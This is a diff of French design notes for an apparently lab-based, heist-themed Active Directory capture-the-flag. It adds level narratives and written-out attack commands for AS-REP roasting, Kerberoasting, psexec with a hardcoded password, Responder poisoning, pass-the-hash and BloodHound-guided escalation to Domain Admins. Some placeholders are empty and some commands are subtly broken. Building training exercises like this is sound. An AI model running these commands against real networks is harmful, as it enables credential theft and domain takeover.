@@ -176,12 +176,24 @@ nmap -Pn -p- -sV -sC 192.168.1.0/24
 ping IP SRV (vu en nmap) => Permet de voir TTL 127 donc WinSRV
 
 
+Key ctf = 127 + Année du Windows Server
 
-Key ctf = 127 + 2019
+Message réussite niveau : 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Level 2 prendre controle d'un compte sans permission (ASREP-Roasting) :
+
+Script pour histoire du niveau :
+
+Après avoir réussi à cartographier le réseau du casino grâce à votre expertise en reconnaissance avec NMAP, Danny Ocean et son équipe sont maintenant prêts à passer à l'étape suivante : infiltrer les systèmes internes pour prendre le contrôle des comptes sans autorisation.
+
+Terry Benedicta sous-estimé une faille cruciale dans son système de sécurité informatique. Les comptes de service de son réseau Active Directory n'ont pas de pré-authentification requise, une vulnérabilité connue sous le nom d'ASREP-Roasting.
+
+Votre objectif est de récupérer les hashs des mots de passe des utilisateurs pour permettre à l'équipe d'Ocean de récuperer ces comptes et de prendre le contrôle des comptes nécessaires pour désactiver les systèmes de sécurité des casinos.
+
+
+Attaque : 
 
 => L'attaque consiste à recuperer le hash d'un password. Cette technique exploite le fait que si un utilisateur n'a pas de pré-authentification requise (ce qui est le cas par défaut pour les comptes de service), le serveur Kerberos renverra le TGT chiffré avec le mot de passe de l'utilisateur sans vérifier le mot de passe au préalable.
 
@@ -198,20 +210,46 @@ GetNPUsers -request -outputfile "hashes.txt" -format "john" -userfile "list_recu
 
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Message réussite niveau :
+
+
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-
-Level 3   : 
-
-Le but est d'elever ses privileges pour etre admin (pas du domaine mais avec certains).
-Attaque à realiser et à definir.
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-Level 4:
+Level 3 (A ESSAYER) : Escalade de privilèges vers un compte IT Admin
+
+Script pour histoire du niveau :
+
+Vous avez désormais à votre actif un ou plusieurs services de casino grâce au cassage des NTLM via ASREP-Roasting. Danny Ocean compte sur vous pour monter d’un cran : obtenir des privilèges d’administrateur local sur le serveur IT pour pouvoir déployer les outils qui couperont net les alarmes et désactiveront les logs de vigilance.
+
+Dans les méandres de l’Active Directory, vous découvrez que plusieurs comptes de service possèdent un SPN (Service Principal Name) et – détail crucial – sont membres du groupe local Administrators sur le serveur ITServer-<casino>. En exploitant la technique du Kerberoasting, vous allez extraire les tickets chiffrés de ces services, casser leurs mots de passe hors ligne, puis vous authentifier en tant qu’Admin IT. Une fois connecté, vous ajouterez votre propre compte pentester au groupe Administrators, ouvrant grand la porte aux modifications de configuration et à la désactivation des dispositifs de sécurité du casino.
+
+Bienvenue dans l’antichambre des salles de contrôle : sans droits suffisants, pas de casse.
+
+Attaque : 
+
+GetUserSPNs.py casino.bellagio.com \
+  -request \
+  -outputfile spn_hashes.txt \
+  -dc-ip 192.168.1.10
+
+john --wordlist=/usr/share/wordlists/rockyou.txt spn_hashes.txt
+
+psexec.py ServiceAccount-Bellagio:SvcAppPass!23@ITServer-Bellagio
+
+net localgroup Administrators pentester /add
+
+Message réussite niveau :
+
+vous êtes administrateur local du serveur IT et pouvez préparer la phase suivante du braquage : la désactivation des systèmes de sécurité et la collecte en toute discrétion des données critiques avant l’assaut sur les coffres. Bonne escalade !
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
 
 Il se rend compte qu'il y a un lien de confiance avec l'AD en face.
 Il est  Admin d'un groupe "IT" et possède donc les droit pour : 
@@ -224,13 +262,103 @@ ou NetBios.
 Il recupere le hash du compte XXX.
 Connexion sur le compte grace au login et au hash (pas le password).
 
+
+Level 4 (A ESSAYER ) : Attaque via le lien de confiance et empoisonnement SMB/LLMNR
+
+Script pour histoire du niveau :
+
+Grâce à vos droits d’Admin IT sur le domaine casino..com, vous découvrez qu’un trust existe avec le domaine casino..com. Muni de vos privilèges, vous pouvez monter le partage \ITServer-Mirage\backups, utilisé pour les sauvegardes régulières.
+
+En explorant ce répertoire, vous tombez sur un fichier lastconn.txt, mis à jour chaque minute par un service de l’autre domaine pour y inscrire la date et l’heure de sa dernière connexion. Vous allez exploiter ce mécanisme pour forcer la machine distante à résoudre un nom de partage disparu, et ainsi capturer le hash NetNTLMv2 du compte qui tente de s’y reconnecter.
+
+Une fois en possession du hash, vous l’utiliserez en “pass-the-hash” pour prendre une session distante et vous garantir un accès administrateur dans le domaine Mirage, ouvrant la voie au sabotage complet des backups et à la mise hors ligne des systèmes de secours.
+
+
+Attaque : 
+
+Monter le partage SMB de l’autre AD
+
+smbclient \\\\ITServer-Mirage.casino.mirage.com\\backups \
+  -U ITAdmin-Bellagio
+
+  Forcer la requête de reconnection
+smb: \> rm -r backup_data
+
+Lancer le poison LLMNR/NBNS pour capturer le hash
+
+responder -I eth0 -wrf
+
+Extraire le hash capturé
+
+grep "SMB-NTLMv2" /usr/share/responder/logs/Responder-Session.log \
+  | awk '{print $NF}' > captured_hash.txt
+  
+
+  Pass-the-hash vers la machine ITServer-Mirage
+psexec.py -hashes :`cat captured_hash.txt` \
+  BackupUser-Mirage@ITServer-Mirage.casino.mirage.com
+
+  Ajouter votre compte pentester au groupe Administrators local
+
+net localgroup Administrators pentester /add
+
+Message réussite niveau :
+Vous êtes à présent Administrateur local du serveur de backups du domaine Mirage. La route est ouverte pour couper définitivement les sauvegardes...
+
  
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-Level 5:
+Level 5 (A ESSAYER) : Cartographie et exploitation des chemins de privilèges avec BloodHound 
 
-Attaue bloodhound à realiser par Lordrosta
+Script pour histoire du niveau :
+
+Vous avez désormais un pied dans chacun des deux domaines grâce à vos accès administratifs locaux sur ITServer- et ITServer-. Danny Ocean veut maintenant une vision globale des relations de confiance et des chemins d’escalade possibles entre les comptes pour planifier l’assaut final : trouver la clef de voûte, le compte ou le groupe dont la compromission offrirait le contrôle quasi-total des deux domaines.
+
+Pour cela, vous allez déployer BloodHound et son agent SharpHound afin de collecter les données Active Directory — sessions ouvertes, appartenances aux groupes, droits délégués, ACL, trusts, etc. — puis analyser le graphe résultant à la recherche du chemin le plus court vers un compte à haute valeur (par exemple Domain Admins ou un Enterprise Admin).
+
+
+Attaque : 
+
+Lancer SharpHound pour la collecte de données : 
+
+Invoke-BloodHound -CollectionMethod All -Domain casino..com -ZipFileName .zip
+
+Invoke-BloodHound -CollectionMethod All -Domain casino..com -ZipFileName .zip
+
+Transférer les archives vers votre poste d’analyste : 
+
+scp Administrator@ITServer-Bellagio:data_bellagio.zip .
+scp Administrator@ITServer-Mirage:data_mirage.zip .
+
+Importer les données dans l’interface BloodHound :
+
+Ouvrez BloodHound (interface web ou application Neo4j)
+
+Dans “Data Import”, chargez successivement data_bellagio.zip puis data_mirage.zip
+
+Identifier les chemins d’escalade :
+
+Utilisez la requête “Shortest Path to Domain Admins” pour chaque domaine.
+
+Explorez les “Paths” qui traversent le trust Bellagio↔Mirage.
+
+Notez les comptes et groupes intermédiaires (par ex. IT, Backup Operators, Server Operators, etc.)
+
+Choisir le vecteur optimal:
+
+Admettons que BloodHound révèle qu’un compte BackupOperator-Mirage a un droit “AddMember” sur le groupe local Administrators du contrôleur de domaine Bellagio via le trust inversé.
+
+Exploitation finale : ajout au groupe privilégié
+
+# Depuis votre session psexec sur ITServer-Mirage
+net group "Domain Admins" BackupOperator-Mirage /domain
+
+
+Message réussite : 
+
+vous maîtrisez à présent les deux domaines. Le déblocage du chemin privilégié via BloodHound a permis de prendre le contrôle des groupes Domain Admins et Enterprise Admins, assurant le succès ultime du casse numérique avant l’attaque physique sur le Strip.
+
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
